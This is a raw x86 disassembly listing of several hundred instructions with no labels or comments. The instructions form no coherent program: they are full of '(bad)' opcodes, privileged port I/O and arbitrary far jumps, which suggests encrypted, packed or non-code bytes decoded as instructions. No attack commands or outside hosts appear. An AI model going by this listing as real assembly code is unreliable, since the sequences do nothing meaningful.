  40b463:	inc    ebx
  40b464:	pop    ds
  40b465:	out    0xb8,eax
  40b467:	sbb    al,0xba
  40b469:	call   0x69c4:0xeaee6bcc
  40b470:	imul   BYTE PTR [ecx-0x60ca6370]
  40b476:	push   ss
  40b477:	pushf  
  40b478:	and    al,0x55
  40b47a:	popf   
  40b47b:	push   0xddcf409f
  40b480:	retf   0x5417
  40b483:	mov    esp,0x2d598898
  40b488:	mov    ?,WORD PTR [edi+0x31152bbb]
  40b48e:	call   0x8552b63f
  40b493:	pushf  
  40b494:	ret    
  40b495:	popa   
  40b496:	cs daa 
  40b498:	repnz mov eax,0xca17cdde
  40b49e:	cli    
  40b49f:	test   DWORD PTR [si+0x6b75],ebx
  40b4a4:	fistp  DWORD PTR [ecx-0x3]
  40b4a7:	dec    eax
  40b4a8:	(bad)  ds:0xe0ec39a5
  40b4ae:	sbb    al,0x15
  40b4b0:	add    BYTE PTR [ecx],0x10
  40b4b3:	mov    WORD PTR [ebp-0x2e],?
  40b4b6:	scas   eax,DWORD PTR es:[edi]
  40b4b7:	xchg   edi,eax
  40b4b8:	pop    ebp
  40b4b9:	xchg   ebx,eax
  40b4ba:	mov    eax,ds:0xc4dc8958
  40b4bf:	cmp    al,0x49
  40b4c1:	je     0x40b4a8
  40b4c3:	fwait
  40b4c4:	dec    eax
  40b4c5:	mov    al,ds:0x5ebdd425
  40b4ca:	inc    esi
  40b4cb:	xchg   edi,eax
  40b4cc:	cmp    al,0xb2
  40b4ce:	sbb    al,BYTE PTR [edi+0x5ac306be]
  40b4d4:	cmc    
  40b4d5:	pop    ss
  40b4d6:	sub    BYTE PTR [edi+0x6c6eb8d1],ch
  40b4dc:	or     eax,DWORD PTR ds:0xb2aa9064
  40b4e2:	das    
  40b4e3:	jno    0x40b50d
  40b4e5:	mov    ah,0x10
  40b4e7:	dec    ebp
  40b4e8:	pop    ds
  40b4e9:	inc    edi
  40b4ea:	outs   dx,DWORD PTR ds:[esi]
  40b4eb:	push   edx
  40b4ec:	xchg   ecx,eax
  40b4ed:	int    0xa5
  40b4ef:	push   es
  40b4f0:	or     eax,DWORD PTR [edx]
  40b4f2:	(bad)  
  40b4f3:	pfcmpge mm7,QWORD PTR [eax+0x4781d294]
  40b4fb:	or     edx,DWORD PTR [esp+eiz*4-0x67]
  40b4ff:	cdq    
  40b500:	inc    esi
  40b501:	enter  0x3e34,0x8e
  40b505:	cmp    eax,0x6882037
  40b50a:	nop
  40b50b:	test   eax,0xb645661c
  40b510:	outs   dx,DWORD PTR ds:[esi]
  40b511:	jecxz  0x40b515
  40b513:	adc    ah,BYTE PTR [ebp-0x76]
  40b516:	mov    DWORD PTR [esi],esi
  40b518:	into   
  40b519:	aas    
  40b51a:	xchg   BYTE PTR [ebx+eax*2-0x75ecebba],cl
  40b521:	jg     0x40b4f3
  40b523:	add    BYTE PTR [ebx+0x4c],al
  40b526:	sbb    dh,BYTE PTR [ebp-0x6812cf18]
  40b52c:	jne    0x40b558
  40b52e:	clc    
  40b52f:	cld    
  40b530:	jb     0x40b545
  40b532:	push   0xffffffc6
  40b534:	mov    esi,0x7c3b1fea
  40b539:	cmp    edx,DWORD PTR [esp+ebp*4+0x55]
  40b53d:	sbb    dh,ch
  40b53f:	aas    
  40b540:	fs out dx,eax
  40b542:	mov    esp,0x91447f6c
  40b547:	sbb    ebp,esp
  40b549:	mov    esp,0x90776cda
  40b54e:	int    0x7b
  40b550:	ret    
  40b551:	outs   dx,BYTE PTR ds:[esi]
  40b552:	sub    al,0xb5
  40b554:	dec    ebx
  40b555:	dec    BYTE PTR [eax+eax*4+0x40]
  40b559:	mov    edi,0xf317f676
  40b55e:	ficom  DWORD PTR [ebp-0x3a]
  40b561:	add    eax,DWORD PTR [ebp+0x67]
  40b564:	jo     0x40b56e
  40b566:	add    al,0xb
  40b568:	je     0x40b568
  40b56a:	pop    ecx
  40b56b:	clc    
  40b56c:	les    edx,FWORD PTR [ebx+0x4594ea64]
  40b572:	repnz arpl WORD PTR [ebp-0x7da3def1],di
  40b579:	rcr    DWORD PTR [ecx-0x6e],1
  40b57c:	data16 shl ch,cl
  40b57f:	jl     0x40b59b
  40b581:	arpl   WORD PTR [ebp-0x5b1e2c0d],si
  40b587:	jl     0x40b5bc
  40b589:	loopne 0x40b529
  40b58b:	mov    ebx,0xe9fd6d45
  40b590:	xchg   esp,eax
  40b591:	mov    ds:0x6a4441e4,eax
  40b596:	jns    0x40b51a
  40b598:	ins    DWORD PTR es:[edi],dx
  40b599:	mov    ecx,0xc4dcd648
  40b59e:	cli    
  40b59f:	cmp    al,0xff
  40b5a1:	test   DWORD PTR [edi],ecx
  40b5a3:	jl     0x40b5af
  40b5a5:	ja     0x40b5b0
  40b5a7:	add    BYTE PTR [edx+0x21],0x8
  40b5ab:	out    dx,al
  40b5ac:	out    dx,eax
  40b5ad:	pop    ebp
  40b5ae:	gs xchg ebp,eax
  40b5b0:	adc    DWORD PTR [ecx-0x2f],ebx
  40b5b3:	sub    BYTE PTR [ecx-0xe],al
  40b5b6:	sti    
  40b5b7:	nop
  40b5b8:	ret    
  40b5b9:	js     0x40b636
  40b5bb:	push   cs
  40b5bc:	adc    al,0x98
  40b5be:	test   BYTE PTR [edi-0x196a5962],dl
  40b5c4:	das    
  40b5c5:	xchg   ebp,eax
  40b5c6:	adc    dh,cl
  40b5c8:	cli    
  40b5c9:	and    eax,0x3965129
  40b5ce:	inc    esp
  40b5cf:	dec    esp
  40b5d0:	pop    ecx
  40b5d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b5d2:	jg     0x40b591
  40b5d4:	add    esp,eax
  40b5d6:	mov    ebp,0xec73d52b
  40b5db:	lahf   
  40b5dc:	test   al,0x51
  40b5de:	shr    DWORD PTR ds:0xcb8346bb,0xc5
  40b5e5:	fadd   st,st(2)
  40b5e7:	(bad)  
  40b5e9:	or     al,0x93
  40b5eb:	retf   0x4dc
  40b5ee:	add    eax,0x508d7375
  40b5f3:	ins    DWORD PTR es:[edi],dx
  40b5f4:	out    0xbb,al
  40b5f6:	es add eax,0xfb9c4d85
  40b5fc:	ret    
  40b5fd:	ins    BYTE PTR es:[edi],dx
  40b5fe:	push   ds
  40b5ff:	inc    eax
  40b600:	mov    cl,0x19
  40b602:	sub    al,0x52
  40b604:	xor    DWORD PTR [edx+edi*8],ebp
  40b607:	cmp    DWORD PTR [ecx+eax*8-0x5ab13995],0xfffffffb
  40b60f:	jg     0x40b5d6
  40b611:	dec    ebp
  40b612:	xchg   esi,eax
  40b613:	mov    cl,0x90
  40b615:	jle    0x40b5a8
  40b617:	repnz retf 0x9833
  40b61b:	sub    edi,edi
  40b61d:	mov    ebx,0x991adbf6
  40b622:	repnz ins BYTE PTR es:[edi],dx
  40b624:	les    edi,FWORD PTR ds:0x2d84c9a7
  40b62a:	out    dx,al
  40b62b:	in     eax,dx
  40b62c:	fldcw  WORD PTR [ebx+0x61ee28ac]
  40b632:	sub    eax,0x1b5f8d3a
  40b637:	dec    ebx
  40b638:	mov    al,0xe5
  40b63a:	dec    edi
  40b63b:	pop    es
  40b63c:	and    esp,ebx
  40b63e:	push   0x37993ae3
  40b643:	leave  
  40b644:	fistp  QWORD PTR [ebp+ebx*4-0x47]
  40b648:	das    
  40b649:	add    BYTE PTR [ebx],ah
  40b64b:	inc    edi
  40b64c:	mov    al,ds:0xd4775968
  40b651:	and    DWORD PTR [edi+0x7],esi
  40b654:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b655:	mov    eax,0xfa830684
  40b65a:	add    esi,DWORD PTR [esi+0x4768a59d]
  40b660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b661:	sbb    edi,DWORD PTR [ecx]
  40b663:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b664:	cmp    BYTE PTR [edi-0x65d31dd9],ch
  40b66a:	and    esp,DWORD PTR [ecx-0x7fbdfd02]
  40b670:	clc    
  40b671:	sub    edi,DWORD PTR [esi]
  40b673:	hlt    
  40b674:	in     al,0x38
  40b676:	add    bh,BYTE PTR [ecx]
  40b678:	mul    DWORD PTR [ebp-0x44d95a28]
  40b67e:	test   eax,0x6617ad59
  40b683:	ja     0x40b68d
  40b685:	dec    ebp
  40b686:	sahf   
  40b687:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b688:	js     0x40b645
  40b68a:	dec    esi
  40b68b:	adc    al,0x7e
  40b68d:	pusha  
  40b68e:	stos   BYTE PTR es:[edi],al
  40b68f:	push   eax
  40b690:	push   ebx
  40b691:	mov    edi,0x118bfbc4
  40b696:	xchg   ecx,eax
  40b697:	popf   
  40b698:	(bad)  
  40b699:	push   ebp
  40b69a:	hlt    
  40b69b:	dec    ebx
  40b69c:	xor    eax,ebx
  40b69e:	jno    0x40b64b
  40b6a0:	out    0x51,eax
  40b6a2:	jno    0x40b6ba
  40b6a4:	icebp  
  40b6a5:	mov    dl,0x4c
  40b6a7:	outs   dx,BYTE PTR ds:[esi]
  40b6a8:	fidivr DWORD PTR [edi-0x4d031cb6]
  40b6ae:	adc    BYTE PTR [edx+ebx*1-0x60c23a3a],dl
  40b6b5:	xchg   edi,eax
  40b6b6:	xor    BYTE PTR [eax+0x568ac1a8],bh
  40b6bc:	jns    0x40b706
  40b6be:	das    
  40b6bf:	sub    BYTE PTR [esi],dh
  40b6c1:	pop    edx
  40b6c2:	les    ecx,FWORD PTR [ebx+edx*8+0x76]
  40b6c6:	jo     0x40b6c2
  40b6c8:	into   
  40b6c9:	sbb    BYTE PTR [ecx+eiz*8+0xcf13b73],0x5f
  40b6d1:	push   esp
  40b6d2:	dec    esp
  40b6d3:	inc    ebp
  40b6d4:	loopne 0x40b6b7
  40b6d6:	int    0x2c
  40b6d8:	es xchg edi,eax
  40b6da:	std    
  40b6db:	push   esi
  40b6dc:	xchg   edx,eax
  40b6dd:	or     dh,BYTE PTR [edi+0x3ac150ec]
  40b6e3:	jns    0x40b6e6
  40b6e5:	cdq    
  40b6e6:	pop    eax
  40b6e7:	jns    0x40b681
  40b6e9:	ins    DWORD PTR es:[edi],dx
  40b6ea:	xchg   ebx,eax
  40b6eb:	push   esp
  40b6ec:	(bad)  
  40b6ed:	addr16 test eax,0x4ea0e013
  40b6f3:	loopne 0x40b694
  40b6f5:	and    BYTE PTR [esi-0x4a],0x64
  40b6f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b6fa:	imul   edx,DWORD PTR [edx],0xffffffa0
  40b6fd:	mov    eax,ds:0x1130952
  40b702:	loop   0x40b6ed
  40b704:	bound  ecx,QWORD PTR [ecx+0x4c9f9513]
  40b70a:	call   FWORD PTR [edi]
  40b70c:	xchg   edx,eax
  40b70d:	popf   
  40b70e:	clc    
  40b70f:	pusha  
  40b710:	xor    DWORD PTR [eax-0x56],edi
  40b713:	rcl    BYTE PTR [ebx+eax*4+0x4180672d],cl
  40b71a:	out    dx,eax
  40b71b:	inc    edi
  40b71c:	mov    ecx,0x5d260c66
  40b721:	setne  BYTE PTR [ecx+0x3d]
  40b725:	mov    edx,0x36de431b
  40b72a:	mov    ebx,gs
  40b72c:	xlat   BYTE PTR ds:[ebx]
  40b72d:	jmp    0xdcc7:0xa1a8e1d6
  40b734:	fcomp  DWORD PTR [edx]
  40b736:	imul   ebp,DWORD PTR [ebp+0x27],0xffffffa2
  40b73a:	bound  edx,QWORD PTR [eax+0x44482745]
  40b740:	jo     0x40b6fa
  40b742:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b743:	imul   DWORD PTR ss:[ebp+ecx*1+0x5b720225]
  40b74b:	push   esp
  40b74c:	mov    DWORD PTR [ebx-0x171505b0],ebx
  40b752:	cli    
  40b753:	mov    bl,ch
  40b755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b756:	mov    DWORD PTR [eax],0xa03eeb8a
  40b75c:	jmp    0x40b6e1
  40b75e:	push   cs
  40b75f:	outs   dx,BYTE PTR ds:[esi]
  40b760:	stos   DWORD PTR es:[edi],eax
  40b761:	push   ebp
  40b762:	sar    BYTE PTR [edx],0x5
  40b765:	cmp    al,0x26
  40b767:	xchg   ebx,eax
  40b768:	or     al,0x4
  40b76a:	js     0x40b7b1
  40b76c:	test   eax,0x550a638c
  40b771:	jbe    0x40b774
  40b773:	sub    DWORD PTR [ebx-0x57b3c49b],esp
  40b779:	fiadd  WORD PTR [ecx-0x24d7b3f1]
  40b77f:	mov    ch,0xc9
  40b781:	aaa    
  40b782:	inc    eax
  40b783:	dec    edx
  40b784:	mov    dh,0xf6
  40b786:	popf   
  40b787:	fstp   DWORD PTR [ebx]
  40b789:	mov    ebx,0x4770d06
  40b78e:	stos   BYTE PTR es:[edi],al
  40b78f:	cdq    
  40b790:	stc    
  40b791:	(bad)  
  40b793:	shr    dh,cl
  40b795:	leave  
  40b796:	sub    DWORD PTR [edi-0x78f504e],0xedf7fdec
  40b7a0:	xor    BYTE PTR [ebx+0x7385edf3],0xb3
  40b7a7:	xor    ecx,DWORD PTR [edx-0x3557536c]
  40b7ad:	push   ebp
  40b7ae:	sub    ebx,DWORD PTR es:0x32c11dc1
  40b7b5:	repz inc esp
  40b7b7:	into   
  40b7b8:	cld    
  40b7b9:	mov    BYTE PTR [ebp+edx*2-0x7c],ch
  40b7bd:	or     dl,al
  40b7bf:	ret    0xdc51
  40b7c2:	push   ecx
  40b7c3:	jns    0x40b798
  40b7c5:	jle    0x40b7e5
  40b7c7:	retf   0xd17c
  40b7ca:	bound  edi,QWORD PTR ds:0xea9f2db
  40b7d0:	(bad)  
  40b7d1:	or     edx,edi
  40b7d3:	(bad)  
  40b7d4:	mov    dh,0x7b
  40b7d6:	aas    
  40b7d7:	xor    eax,0xbae163c5
  40b7dc:	stos   BYTE PTR es:[edi],al
  40b7dd:	retf   
  40b7de:	stc    
  40b7df:	mov    ah,0xed
  40b7e1:	sbb    eax,0xb92ff286
  40b7e6:	xor    dl,BYTE PTR [edi]
  40b7e8:	in     al,dx
  40b7e9:	push   esi
  40b7ea:	les    edi,FWORD PTR ds:0x44570e7
  40b7f0:	nop
  40b7f1:	pushf  
  40b7f2:	push   eax
  40b7f3:	mov    al,ds:0x7028916d
  40b7f8:	or     eax,0xbd4d4302
  40b7fd:	pop    edi
  40b7fe:	pusha  
  40b7ff:	xchg   esi,eax
  40b800:	je     0x40b822
  40b802:	lds    ebx,FWORD PTR [ebp+eax*2+0x31afcb2f]
  40b809:	int3   
  40b80a:	cli    
  40b80b:	jo     0x40b79b
  40b80d:	inc    ebx
  40b80e:	jle    0x40b816
  40b810:	or     ebx,edi
  40b812:	ret    0xb3f2
  40b815:	lea    esi,cs:[esi]
  40b818:	test   BYTE PTR [edx],0x44
  40b81b:	xor    dl,BYTE PTR [edi]
  40b81d:	clc    
  40b81e:	dec    esp
  40b81f:	dec    eax
  40b820:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b821:	in     eax,dx
  40b822:	inc    esp
  40b823:	fisttp WORD PTR [ecx+0x5b]
  40b826:	div    BYTE PTR ds:0xa80faf88
  40b82c:	lds    sp,DWORD PTR [edi+0x59]
  40b830:	xchg   ebx,eax
  40b831:	or     BYTE PTR [esi+0xd3d3e47],al
  40b837:	mov    eax,ds:0x6b695a2e
  40b83c:	adc    eax,0x54d7ca5a
  40b841:	push   0x44298df0
  40b846:	dec    edi
  40b847:	lds    edx,FWORD PTR [ebp+0x1e]
  40b84a:	push   ebx
  40b84b:	outs   dx,DWORD PTR ds:[esi]
  40b84c:	jge    0x40b812
  40b84e:	test   DWORD PTR gs:[ebp+0x650ed9a5],eax
  40b855:	out    0x2a,al
  40b857:	jle    0x40b864
  40b859:	(bad)  [ecx+0x58e933b8]
  40b85f:	lds    ebp,FWORD PTR [edx-0x16883d71]
  40b865:	sti    
  40b866:	sub    BYTE PTR [edx+eax*8],dl
  40b869:	not    BYTE PTR [ebx-0x31]
  40b86c:	in     al,0x5a
  40b86e:	jnp    0x40b85a
  40b870:	out    dx,eax
  40b871:	les    eax,FWORD PTR [ebp-0x5]
  40b874:	or     al,0x2c
  40b876:	mov    bl,0x35
  40b878:	jae    0x40b836
  40b87a:	add    ecx,DWORD PTR [ecx-0x731be17a]
  40b880:	mov    al,0x78
  40b883:	sbb    al,0x25
  40b885:	jbe    0x40b822
  40b887:	mov    BYTE PTR [edi],ah
  40b889:	(bad)  
  40b88a:	fstp   TBYTE PTR [ebx+ebp*1-0x1c]
  40b88e:	aas    
  40b88f:	jmp    0x8623:0xa730803d
  40b896:	test   DWORD PTR [ebp+0x46],ecx
  40b899:	mov    dh,BYTE PTR [ebp+0x27]
  40b89c:	sbb    edi,eax
  40b89e:	or     al,0x22
  40b8a0:	loop   0x40b85e
  40b8a2:	ds pop edx
  40b8a4:	xchg   ebx,eax
  40b8a5:	jmp    0xc66ec224
  40b8aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b8ab:	sub    eax,0x5bef486a
  40b8b0:	movlps QWORD PTR [ecx+esi*8+0x1f],xmm3
  40b8b5:	sbb    al,0x80
  40b8b7:	xchg   edi,eax
  40b8b8:	jnp    0x40b8bc
  40b8ba:	xor    BYTE PTR [esi-0x650d5fef],bh
  40b8c0:	daa    
  40b8c1:	lea    ecx,[esi-0x8]
  40b8c4:	mov    eax,ds:0xc3feb20e
  40b8c9:	scas   al,BYTE PTR es:[edi]
  40b8ca:	mov    al,0xfb
  40b8cc:	push   0xbe767300
  40b8d1:	fs mov ah,0x10
  40b8d4:	enter  0x8e7b,0x45
  40b8d8:	and    eax,0xbb07ec4f
  40b8dd:	inc    eax
  40b8de:	xchg   ebp,eax
  40b8df:	dec    ebp
  40b8e0:	inc    esi
  40b8e1:	xchg   ebx,eax
  40b8e2:	std    
  40b8e3:	mov    ds:0xaf9557af,eax
  40b8e8:	inc    eax
  40b8e9:	sbb    al,0x3
  40b8eb:	inc    eax
  40b8ec:	outs   dx,DWORD PTR ds:[esi]
  40b8ed:	jmp    0x40b8d2
  40b8ef:	in     eax,dx
  40b8f0:	xor    DWORD PTR [esi+0x40],ecx
  40b8f3:	out    dx,eax
  40b8f4:	in     eax,0xff
  40b8f6:	ja     0x40b8aa
  40b8f8:	or     bl,BYTE PTR [ecx+0x318a2f79]
  40b8fe:	inc    esi
  40b8ff:	les    ebp,FWORD PTR [edx-0xe]
  40b902:	pop    ss
  40b903:	pop    esp
  40b904:	mov    dl,0x24
  40b906:	lahf   
  40b907:	shl    DWORD PTR [ebp-0x723fe091],cl
  40b90d:	enter  0xc03d,0x22
  40b911:	inc    esi
  40b912:	pmaxsw mm3,QWORD PTR [esi+0x63]
  40b916:	adc    DWORD PTR [esi],edi
  40b918:	retf   0x84ab
  40b91b:	xchg   edi,eax
  40b91c:	sub    BYTE PTR [ebp+0x2d],bl
  40b91f:	mov    eax,ds:0x1fd2a90e
  40b924:	std    
  40b925:	(bad)  
  40b926:	pop    esp
  40b927:	mov    DWORD PTR [eax+eiz*1+0x641e4d4],edi
  40b92e:	pushf  
  40b92f:	sbb    eax,0xb90e87d9
  40b934:	pop    esp
  40b935:	mov    ah,dh
  40b937:	scas   al,BYTE PTR es:[edi]
  40b938:	and    BYTE PTR [edx+0x25488af6],0xee
  40b93f:	inc    edx
  40b940:	jg     0x40b959
  40b942:	out    dx,al
  40b943:	lods   eax,DWORD PTR ds:[esi]
  40b944:	imul   BYTE PTR [ecx+0x74]
  40b947:	or     BYTE PTR ds:0x8703a8d6,ah
  40b94d:	add    BYTE PTR [esi+edx*8+0x64],0x1b
  40b952:	cs test al,0xf6
  40b955:	inc    eax
  40b956:	jp     0x40b8d9
  40b958:	mov    dl,BYTE PTR [ebp+0x1b4e8e5d]
  40b95e:	test   esp,edx
  40b960:	inc    edx
  40b961:	cmp    BYTE PTR [esi+0x5e02b49a],al
  40b967:	add    DWORD PTR [ebp-0x714eaff7],eax
  40b96d:	mov    WORD PTR [esi+0x323f6375],ds
  40b973:	pop    ecx
  40b974:	pop    edx
  40b975:	mov    ecx,0x7148f163
  40b97a:	or     eax,0x76155db4
  40b97f:	or     ebp,DWORD PTR [ecx]
  40b981:	fiadd  WORD PTR [eax-0x28]
  40b984:	sub    DWORD PTR [ecx],eax
  40b986:	push   DWORD PTR [edx]
  40b988:	sub    BYTE PTR [edi+eax*2+0x6d7fb1f8],al
  40b98f:	fisttp DWORD PTR [edx+0x6b]
  40b992:	xchg   esp,eax
  40b993:	icebp  
  40b994:	dec    esp
  40b995:	jns    0x40b943
  40b997:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b999:	jg     0x40b9d0
  40b99b:	xchg   edi,eax
  40b99c:	dec    ebx
  40b99d:	xchg   ebp,eax
  40b99e:	mov    cl,0x38
  40b9a0:	test   DWORD PTR [ebx+0xdb285a6],ebx
  40b9a6:	(bad)  
  40b9a8:	push   esp
  40b9a9:	cmp    al,0xf3
  40b9ab:	adc    al,dh
  40b9ad:	push   ebx
  40b9ae:	idiv   BYTE PTR [esi-0x6f613750]
  40b9b4:	cmp    eax,0x63efa850
  40b9b9:	lds    eax,FWORD PTR [edi+0x5a874a17]
  40b9bf:	mov    ecx,esi
  40b9c1:	or     BYTE PTR [edi-0x4],ah
  40b9c4:	inc    ebp
  40b9c5:	in     eax,dx
  40b9c6:	fisubr WORD PTR [ebx-0x1ea7f57]
  40b9cc:	(bad)  
  40b9cd:	cmp    esp,DWORD PTR [esi+0x12d2d2fa]
  40b9d3:	jno    0x40b99f
  40b9d5:	dec    esi
  40b9d6:	pop    edx
  40b9d7:	jge    0x40b9d7
  40b9d9:	sti    
  40b9da:	xor    cl,cl
  40b9dc:	sbb    al,0xf8
  40b9de:	sbb    DWORD PTR [eax+0x26],ecx
  40b9e1:	(bad)  
  40b9e2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9e3:	sub    ebx,ebx
  40b9e5:	mov    edi,DWORD PTR [edx]
  40b9e7:	and    DWORD PTR [esi-0x59],esp
  40b9ea:	add    dl,BYTE PTR [ebx]
  40b9ec:	cld    
  40b9ed:	ja     0x40b976
  40b9ef:	cwde   
  40b9f0:	fwait
  40b9f1:	jne    0x40b98a
  40b9f3:	mov    ebp,0xf7424b5b
  40b9f8:	ss (bad) 
  40b9fa:	pushf  
  40b9fb:	enter  0x44e8,0x67
  40b9ff:	mul    al
  40ba01:	into   
  40ba02:	dec    ecx
  40ba03:	pusha  
  40ba04:	inc    ecx
  40ba05:	adc    al,0xa6
  40ba07:	ficom  WORD PTR [ebp-0x41]
  40ba0a:	mov    ebx,esp
  40ba0c:	mov    dl,0xf8
  40ba0e:	xor    ebx,ebx
  40ba10:	mov    ebp,0x472a7415
  40ba15:	push   ebp
  40ba16:	ins    DWORD PTR es:[edi],dx
  40ba17:	repz int3 
  40ba19:	mov    bh,BYTE PTR [ecx-0xb4bff52]
  40ba1f:	sbb    DWORD PTR [ecx+0x1c5f9475],0x337e503b
  40ba29:	jnp    0x40b9b2
  40ba2b:	jp     0x40ba7a
  40ba2d:	push   0xffffff92
  40ba2f:	ins    BYTE PTR es:[edi],dx
  40ba30:	dec    edx
  40ba31:	pusha  
  40ba32:	adc    DWORD PTR [eax-0xf],ebp
  40ba35:	leave  
  40ba36:	daa    
  40ba37:	jno    0x40ba41
  40ba39:	pusha  
  40ba3a:	shl    BYTE PTR [edi+0x71],0x50
  40ba3e:	stc    
  40ba3f:	rcr    DWORD PTR [edx],0xce
  40ba42:	jne    0x40b9e1
  40ba44:	push   ss
  40ba45:	lods   al,BYTE PTR ds:[esi]
  40ba46:	mov    dl,dh
  40ba48:	hlt    
  40ba49:	mov    esi,0x693a3c9f
  40ba4e:	add    ebx,DWORD PTR fs:[edi+edi*8-0x4]
  40ba53:	dec    esp
  40ba54:	and    eax,0x4739d726
  40ba59:	mov    ah,0xf8
  40ba5b:	dec    eax
  40ba5c:	jae    0x40ba22
  40ba5e:	xor    dh,BYTE PTR [esi+0x5d]
  40ba61:	mov    cl,0xbc
  40ba63:	jp     0x40bac7
  40ba65:	fisub  DWORD PTR [ebp+ecx*4+0x50]
  40ba69:	push   0xffffff9f
  40ba6b:	leave  
  40ba6c:	xor    eax,0xcad768a9
  40ba71:	adc    DWORD PTR [esp+0x533674cf],ecx
  40ba78:	xchg   esp,eax
  40ba79:	sbb    DWORD PTR ds:[ebp-0x22],ecx
  40ba7d:	xor    eax,0x740c6832
  40ba82:	clc    
  40ba83:	retf   0x49d3
  40ba86:	push   0x44
  40ba88:	add    bl,dh
  40ba8a:	pop    ss
  40ba8b:	add    DWORD PTR [ebx],esi
  40ba8d:	mov    ch,al
  40ba8f:	push   ebx
  40ba90:	je     0x40ba46
  40ba92:	jg     0x40ba87
  40ba94:	push   esi
  40ba95:	push   ss
  40ba96:	out    dx,al
  40ba97:	xchg   ebp,eax
  40ba98:	ret    0xa2e0
  40ba9b:	popf   
  40ba9c:	xchg   ecx,eax
  40ba9d:	stos   DWORD PTR es:[edi],eax
  40ba9e:	or     dh,BYTE PTR [ebx]
  40baa0:	mov    cs,eax
  40baa2:	in     eax,0x53
  40baa4:	mov    esp,0x70c469c3
  40baa9:	lods   eax,DWORD PTR ds:[esi]
  40baaa:	jae    0x40baa8
  40baac:	mov    esi,0x4eb6ef68
  40bab1:	xor    al,0xa
  40bab3:	fild   DWORD PTR [esi+edx*1-0x1b869c70]
  40baba:	fbld   TBYTE PTR [ecx+0x731d2d87]
  40bac0:	outs   dx,BYTE PTR ds:[esi]
  40bac1:	(bad)  
  40bac3:	add    DWORD PTR [edx-0x4b],esi
  40bac6:	or     ch,BYTE PTR [edi-0x71a405fe]
  40bacc:	imul   eax,DWORD PTR [ebx+0x2c],0x19f6abd
  40bad3:	scas   eax,DWORD PTR es:[edi]
  40bad4:	out    dx,eax
  40bad5:	fcomp  DWORD PTR [edx]
  40bad7:	lods   al,BYTE PTR ds:[esi]
  40bad8:	jg     0x40bb0e
  40bada:	push   0x36
  40badc:	push   edi
  40badd:	(bad)  
  40bade:	rcr    BYTE PTR [ebx+0x654f2aa8],1
  40bae4:	jmp    0x3daab054
  40bae9:	cmp    eax,0xa49f7eda
  40baee:	icebp  
  40baef:	add    esp,DWORD PTR [ebp+0x57]
  40baf2:	mov    esp,0x36e8ec1c
  40baf7:	add    al,0x4f
  40baf9:	sti    
  40bafa:	jb     0x40bb3a
  40bafc:	sar    esp,0x11
  40baff:	dec    ecx
  40bb00:	xchg   edi,eax
  40bb01:	pop    ecx
  40bb02:	cs popa 
  40bb04:	sub    BYTE PTR [ecx+0x4f5958d],dh
  40bb0a:	jno    0x40bb7c
  40bb0c:	data16 es sahf 
  40bb0f:	imul   edi,DWORD PTR [esi+edi*1-0x72],0xa84f89e8
  40bb17:	and    eax,0x4914fd11
  40bb1c:	fwait
  40bb1d:	mov    ds,WORD PTR [edi+0x361e9735]
  40bb23:	(bad)  [edi+0x33]
  40bb26:	jmp    0xa1c:0x5c18ae79
  40bb2d:	inc    edi
  40bb2e:	fstp   TBYTE PTR [edi-0x37e8feae]
  40bb34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bb35:	mov    WORD PTR [ebp-0x58ee18e9],?
  40bb3b:	mov    WORD PTR [ecx-0x26],?
  40bb3e:	sahf   
  40bb3f:	mov    dl,0xe4
  40bb41:	cwde   
  40bb42:	dec    edx
  40bb43:	ins    BYTE PTR es:[di],dx
  40bb45:	cwde   
  40bb46:	fwait
  40bb47:	call   0xba41:0x5e00c0c7
  40bb4e:	ror    DWORD PTR [edx],cl
  40bb50:	ss (bad) 
  40bb53:	lds    edi,FWORD PTR [edi]
  40bb55:	sub    DWORD PTR [edx+0x2d],0x72
  40bb59:	pop    eax
  40bb5a:	sbb    al,0x76
  40bb5c:	sub    edi,DWORD PTR [edi+0x3c]
  40bb5f:	out    dx,al
  40bb60:	cmp    dl,BYTE PTR [ebx]
  40bb62:	out    dx,al
  40bb63:	and    eax,DWORD PTR [eax]
  40bb65:	jp     0x40bb25
  40bb67:	leave  
  40bb68:	xor    DWORD PTR [ecx+0x6f],ecx
  40bb6b:	mov    edx,0xb9a15ebb
  40bb70:	out    dx,eax
  40bb71:	in     al,0x30
  40bb73:	fbstp  TBYTE PTR [edi-0x50]
  40bb76:	fnsave [esi]
  40bb78:	xor    DWORD PTR [edi*4-0x29f90523],ebp
  40bb7f:	dec    ecx
  40bb80:	pop    ss
  40bb81:	sbb    eax,0x91aa0ebe
  40bb86:	addr16 dec esp
  40bb88:	xchg   ebp,eax
  40bb89:	imul   eax,DWORD PTR [esi+0x79ec8b8],0xa5b2c78f
  40bb93:	aas    
  40bb94:	test   al,0x28
  40bb96:	fisubr DWORD PTR [eax-0x63446337]
  40bb9c:	nop
  40bb9d:	outs   dx,DWORD PTR ds:[esi]
  40bb9e:	xor    al,0xd3
  40bba0:	ss js  0x40bb24
  40bba3:	jmp    0x40bb35
  40bba5:	lahf   
  40bba6:	sub    BYTE PTR [ecx+eax*1],al
  40bba9:	scas   eax,DWORD PTR es:[edi]
  40bbaa:	jle    0x40bb53
  40bbac:	test   BYTE PTR [ecx+0x31f6adab],bl
  40bbb2:	les    ebp,FWORD PTR [edx]
  40bbb4:	mov    ebp,0xd383c3ca
  40bbb9:	pop    ecx
  40bbba:	test   eax,0x49de9665
  40bbbf:	push   edx
  40bbc0:	lea    esi,[ebp-0x55d458a7]
  40bbc6:	jl     0x40bbc5
  40bbc8:	inc    BYTE PTR [ebx+0x62b3df36]
  40bbce:	in     al,0x12
  40bbd0:	in     eax,0x4
  40bbd2:	dec    eax
  40bbd3:	out    dx,al
  40bbd4:	outs   dx,DWORD PTR ds:[esi]
  40bbd5:	push   edi
